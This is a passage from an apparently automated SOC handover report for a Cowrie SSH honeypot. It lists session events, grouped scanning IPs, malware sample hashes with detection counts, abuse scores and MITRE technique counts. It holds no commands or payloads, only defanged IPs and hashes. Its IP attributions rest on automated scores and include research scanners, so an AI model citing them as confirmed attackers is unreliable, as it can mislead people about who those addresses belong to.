| `2026-05-31 10:16:31` | `cowrie.session.params` |
| `2026-05-31 10:16:31` | `cowrie.command.input` |
| `2026-05-31 10:16:31` | `cowrie.log.closed` |
| `2026-05-31 10:16:32` | `cowrie.session.params` |
| `2026-05-31 10:16:32` | `cowrie.command.input` |
| `2026-05-31 10:16:32` | `cowrie.log.closed` |
| `2026-05-31 10:16:32` | `cowrie.session.params` |
| `2026-05-31 10:16:32` | `cowrie.command.input` |
| `2026-05-31 10:16:32` | `cowrie.log.closed` |
| `2026-05-31 10:16:33` | `cowrie.session.params` |
| `2026-05-31 10:16:33` | `cowrie.command.input` |
| `2026-05-31 10:16:33` | `cowrie.log.closed` |
| `2026-05-31 10:16:33` | `cowrie.session.params` |
| `2026-05-31 10:16:33` | `cowrie.command.input` |
| `2026-05-31 10:16:33` | `cowrie.log.closed` |
| `2026-05-31 10:16:34` | `cowrie.session.params` |
| `2026-05-31 10:16:34` | `cowrie.command.input` |
| `2026-05-31 10:16:34` | `cowrie.log.closed` |
| `2026-05-31 10:16:34` | `cowrie.session.params` |
| `2026-05-31 10:16:34` | `cowrie.command.input` |
| `2026-05-31 10:16:34` | `cowrie.log.closed` |
| `2026-05-31 10:16:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.193[.]72` to AbuseIPDB if not already reported
- [ ] Block `119.96.193[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `187.108.193[.]54` | **149** | 2026-05-31 08:54 | 2026-05-31 11:41 | 84m | 0 | `T1592` | 🟠 MEDIUM |
| `159.203.20[.]239` | **20** | 2026-05-31 08:53 | 2026-05-31 11:37 | 10m | 0 | `T1592` | 🟠 MEDIUM |
| `40.83.182[.]122` | **10** | 2026-05-31 09:56 | 2026-05-31 10:16 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `44.243.254[.]130` | **8** | 2026-05-31 09:53 | 2026-05-31 09:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `119.96.193[.]72` | **4** | 2026-05-31 10:00 | 2026-05-31 10:18 | 8m | 0 | `T1592` | 🟢 LOW |
| `52.15.68[.]132` | **4** | 2026-05-31 09:55 | 2026-05-31 11:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `135.148.33[.]168` | **3** | 2026-05-31 09:52 | 2026-05-31 11:32 | 2m | 0 | `T1592` | 🟢 LOW |
| `43.173.69[.]147` | **3** | 2026-05-31 08:58 | 2026-05-31 09:02 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `67.9.57[.]233` | **3** | 2026-05-31 08:58 | 2026-05-31 09:03 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `47.103.2[.]53` | **2** | 2026-05-31 09:59 | 2026-05-31 09:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.250.186[.]31` | **2** | 2026-05-31 09:57 | 2026-05-31 09:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]135` | **2** | 2026-05-31 11:41 | 2026-05-31 11:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.166[.]75` | 1 | 2026-05-31 09:00 | 2026-05-31 09:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.104[.]37` | 1 | 2026-05-31 08:55 | 2026-05-31 08:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-05-31 08:52 | 2026-05-31 08:52 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.73[.]80` | 1 | 2026-05-31 08:55 | 2026-05-31 08:55 | 8s | 0 | `T1592` | 🟢 LOW |
| `180.76.184[.]79` | 1 | 2026-05-31 08:54 | 2026-05-31 08:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.102.73[.]93` | 1 | 2026-05-31 11:30 | 2026-05-31 11:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.189.221[.]17` | 1 | 2026-05-31 10:09 | 2026-05-31 10:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.221.215[.]114` | 1 | 2026-05-31 10:04 | 2026-05-31 10:04 | 12s | 0 | `T1592` | 🟢 LOW |
| `58.209.234[.]84` | 1 | 2026-05-31 11:41 | 2026-05-31 11:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.169.16[.]137` | 1 | 2026-05-31 09:09 | 2026-05-31 09:09 | 13s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]222` | 1 | 2026-05-31 10:32 | 2026-05-31 10:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `8.154.4[.]151` | 1 | 2026-05-31 09:03 | 2026-05-31 09:05 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `187.108.193[.]54` | BR | EVEO S.A. | **100** ⚠️ | 10 |
| `8.154.4[.]151` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 41 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `43.173.69[.]147` | US | ACEVILLE PTE.LTD. | **100** ⚠️ | 44 |
| `62.169.16[.]137` | FR | Contabo GmbH | **100** ⚠️ | 4 |
| `211.221.215[.]114` | KR | Korea Telecom | **100** ⚠️ | 16 |
| `52.15.68[.]132` | US | Amazon Technologies Inc. | **100** ⚠️ | 1 |
| `66.132.172[.]222` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `194.102.73[.]93` | RO | Universitatea de Stiinte Agricole si Medicina Veterinara Cluj-Napoca | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 54 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 18 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 237 cases |
| Tool 34  | Credential Extractor        | ✅ 30 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (1.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 11 priority case(s) shown individually · 24 recon entry/entries in table (12 group(s) consolidating 210 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-31T11:43:24Z_
